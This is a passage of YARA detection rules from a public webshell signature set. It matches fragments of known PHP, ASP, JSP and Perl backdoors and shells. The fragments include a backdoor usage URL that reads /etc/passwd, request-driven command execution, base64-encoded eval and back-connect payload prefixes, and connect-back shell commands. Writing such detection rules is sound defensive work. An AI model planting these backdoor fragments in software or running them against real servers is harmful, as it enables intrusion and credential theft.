		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4118-L4130"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
		logic_hash = "5a2125fc447344f8cc708503d9e4dd82f9b873e40ded497ef9e01974d08bf043"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "rand(1,99999);$sj98"
		$s1 = "$dump_file.='`'.$rows2[0].'`"
		$s3 = "filename=\\\"dump_{$db_dump}_${table_d"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Cmdasp_Asp {
    meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "79e0ba85-ed4b-5909-a2fd-9b4125598078"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4131-L4144"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
		logic_hash = "95dc25ecd47b43edbd7e7e36966377aa09da769aff2bc1c33a7df87989611bfa"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Simple_Backdoor_Php {
    meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5607f501-a750-59be-9595-5ac71ea6f74b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4145-L4157"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		logic_hash = "e2e98580b59727313de298fab0009704f621b1b6556220d5065118d960f7a068"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Mysql_Shell_Php {
    meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e517984b-575c-5ead-a438-9767d2c74099"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4158-L4170"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
		logic_hash = "dbd825e1056c41efaf80c0495ba7b6cf1c88403b997ea7ac1378512a19f7ed8a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Dive_Shell_1_0___Emperor_Hacking_Team_Php {
    meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d75294a4-a0a7-5c74-bb7a-766db477633c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4171-L4184"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
		logic_hash = "bd51b625359799178ad3c8e02ba5bb5fca89e6e14769b86dd35c2b8a1049599f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Asmodeus_V0_1_Pl {
    meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cfd082a8-56fa-54bc-a683-c0052f78e12e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4185-L4198"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0978b672db0657103c79505df69cb4bb"
		logic_hash = "be0130c9d2a5d29e6ef8749b0058c96c2ca1ecb9823fd14a8a2c82978cf3d104"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Backup_Php_Often_With_C99Shell {
    meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4199-L4211"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
		logic_hash = "e27d00ebfbac2565568b9a97552a331db91b4e9aa318febb048937f5c3a1a1ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Reader_Asp {
    meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "70094d24-fa3a-503c-b9b6-294a883fc52c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4212-L4224"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "ec0dc3b050d84e852e0c18bd00961f109d3506fa7f2e8656448bd5edd28d9305"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Phpshell17_Php {
    meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea1f657c-2023-50bb-a2ee-33c53ee8fb5e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4225-L4237"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
		logic_hash = "a9306747a5c9756f393c61562ed4a601c75c3a9491ad19a7b7dbae1fbd505e9a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Myshell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4238-L4250"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "62783d1db52d05b1b6ae2403a7044490"
		logic_hash = "dd7b0fa637a8317986de0c2312b4b552f1110fb5a64590a9a21c854e5985fbb6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Simshell_1_0___Simorgh_Security_MGZ_Php {
    meta:
		description = "Semi-Auto-generated  - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "51565555-a17b-59c7-b433-c3166fe0d7f0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4251-L4264"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "37cb1db26b1b0161a4bf678a6b4565bd"
		logic_hash = "590a1572877fafcd4425a04c12cd56194f03a63b7acad93c39d4b16dc5a1902d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Simorgh Security Magazine "
		$s1 = "Simshell.css"
		$s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
		$s3 = "www.simorgh-ev.com"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Jspshall_Jsp {
    meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4bccad33-d26e-52c2-b7f8-802f2c8f3889"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4265-L4277"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
		logic_hash = "94c458d3f38ba21348b0202e2b81bbbc3859e97d64f101a9ea7ec6f036e38bc5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php {
    meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4278-L4289"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e425241b928e992bde43dd65180a4894"
		logic_hash = "7b0f4f4afde7dcb44c9d877a72c961f3666278ce28a24ae8068cfbc32639e307"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"

	condition:
		all of them
}
rule SIGNATURE_BASE_Rootshell_Php {
    meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aec6621e-f23a-5f9f-91f1-d2f1b1ab58d0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4290-L4303"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "265f3319075536030e59ba2f9ef3eac6"
		logic_hash = "f836dd1825dc84212d32a034c0dde45d60ccd1eb667018abb60d671b61192666"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Connectback2_Pl {
    meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ddebc62-17d2-577e-84bd-207367078327"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4304-L4316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "473b7d226ea6ebaacc24504bd740822e"
		logic_hash = "7316c93f12dbbf6d0235601d8be88c199e37955507925222d00041d0ceaf01c7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Defacekeeper_0_2_Php {
    meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "671323e2-42cb-5ce0-9839-5d01c446471c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4317-L4329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
		logic_hash = "0ee3fed3441e9561867508e324d7a6b1808a8923513bf1c9b82f8238224c994c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Shells_PHP_Wso {
    meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fdce6094-a88e-5da6-aeb0-bc97b15bf397"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4330-L4341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "33e2891c13b78328da9062fbfcf898b6"
		logic_hash = "31ef69228b66b30300006f63b1e4d6e92c2512caca4bd915d418b48564b39c47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Backdoor1_Php {
    meta:
		description = "Semi-Auto-generated  - file backdoor1.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "89f44a1c-8a42-58f6-9308-371f4e652bff"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4342-L4354"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e1adda1f866367f52de001257b4d6c98"
		logic_hash = "7c8840dc91c16b9fa19fee16e0159a7f13db23c96596e18da0cdab07931ce35b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
		$s2 = "class backdoor {"
		$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Elmaliseker_Asp {
    meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4355-L4368"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "969f0f12449375a9ebbb8a68fd4b3db395927416d5cceccdb7f2c64310430880"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Indexer_Asp {
    meta:
		description = "Semi-Auto-generated  - file indexer.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "84ff60f9-36f7-5d29-9f38-8088fb42582e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4369-L4380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		logic_hash = "0a51f15bfb4289dcb70e1e0b96d100be12901ebf26ed9c0e543eda5f4aa91f1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
		$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Dxshell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b89930b7-acf3-5078-8429-d59e27e4b00c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4381-L4392"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
		logic_hash = "821f9295eba6119ad08349e769d1909cd7836b4e35795915e94095cf715dc6e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}
rule SIGNATURE_BASE_S72_Shell_V1_1_Coding_Html {
    meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "dfd3b80e-6245-5f74-9d6a-6006218891ac"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4393-L4405"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "aef8840b72e5c435c11150007d6b3af2943126fefdc6df343d0f73755340e260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""

	condition:
		1 of them
}
rule SIGNATURE_BASE_Kacak_Asp {
    meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ae15174-b84a-5826-b768-7afed65196db"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4406-L4419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "907d95d46785db21331a0324972dda8c"
		logic_hash = "8542a3985dff2d1eb42f4d2c9f30405a4817a8e30075225c518ec52381f1f7df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"

	condition:
		1 of them
}
rule SIGNATURE_BASE_PHP_Backdoor_Connect_Pl_Php {
    meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "96c9258e-3894-5ee9-b52c-eb7ba7454416"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4420-L4432"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "57fcd9560dac244aeaf95fd606621900"
		logic_hash = "b141546f45767884f9c8b1cc4c09ea25f90c0f3a3633bfeecad78b60e7f20306"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Antichat_Socks5_Server_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "35d0930c-ef07-5fd4-9d7a-c0d685f92339"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4433-L4445"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
		logic_hash = "d6b203561f95f431b3d2c241011ae08c05619d45c5900a28137481c029e8297e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Antichat_Shell_V1_3_Php {
    meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "856cf977-24da-58e0-b6d2-820c92075ecc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4446-L4458"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "566c324f3bf44ce9f32ddad82a8d3daa87a8a75b5ca0c8286bc912a8ae4ac8e9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_Php {
    meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3e81f628-31b4-5c22-943e-62c8cb4c0c4d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4459-L4471"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d6d2a3999f2e8ceb70f57697c0a845edbbcfce0aba151ec6a0ac23f55265cd47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."

	condition:
		1 of them
}
rule SIGNATURE_BASE_Mysql_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file mysql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4472-L4484"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "12bbdf6ef403720442a47a3cc730d034"
		logic_hash = "60e235310f378698ffcc3ae6a07ab5dd94a660ca4b1504cc878d9741f751d5d1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
